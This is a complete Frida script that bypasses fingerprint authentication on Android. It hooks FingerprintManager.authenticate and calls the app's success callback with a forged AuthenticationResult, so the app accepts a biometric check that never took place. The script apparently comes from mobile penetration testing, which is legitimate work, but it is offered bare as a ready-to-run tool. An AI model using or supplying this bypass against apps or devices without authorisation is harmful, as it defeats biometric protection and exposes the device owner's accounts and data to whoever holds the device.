Java.perform(function(){
	hookFingerprintManager()
;})

function getRes(resultObj){
	var authResObj = resultObj.$new(null, null, 0, false);
	return authResObj;
}

function hookFingerprintManager(){
	var fingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
	var cryptoObj = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject');
	var authResult = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
	console.log("")
	var fingerprintManager_authenticate = fingerprintManager['authenticate'].overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler');
	
	fingerprintManager_authenticate.implementation = function (crypto, cancel, flags, callback, handler){
		console.log("[+] Hooking FingerprintManager.authenticate method...")
		var authResObj = getRes(authResult);
		callback.onAuthenticationSucceeded(authResObj);
		console.log("[+] Injecting crafted object on onAuthenticationSucceeded callback method...")
	}
}
